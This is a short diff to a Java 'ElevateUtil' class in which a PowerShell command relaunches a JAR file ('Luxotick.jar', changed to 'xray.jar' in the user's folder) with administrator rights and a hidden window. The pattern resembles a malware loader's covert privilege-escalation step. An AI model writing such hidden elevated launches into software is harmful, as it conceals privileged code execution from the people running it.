@@ -7,8 +7,10 @@ import java.util.Arrays;
 
 public class ElevateUtil {
     public synchronized void elevate() {
+
+        String user = System.getProperty("user.name");
         try {
-            Process process = Runtime.getRuntime().exec("powershell.exe -Command \"Start-Process java -ArgumentList '-jar', 'C:\\Users\\Public\\Documents\\Luxotick.jar' -Verb RunAs -WindowStyle Hidden\"");
+            Process process = Runtime.getRuntime().exec("powershell.exe -Command \"Start-Process java -ArgumentList '-jar', 'C:\\Users\\" + user + "\\xray.jar' -Verb RunAs -WindowStyle Hidden\"");
 
             System.out.println("Elevated!");
             wait(5000);
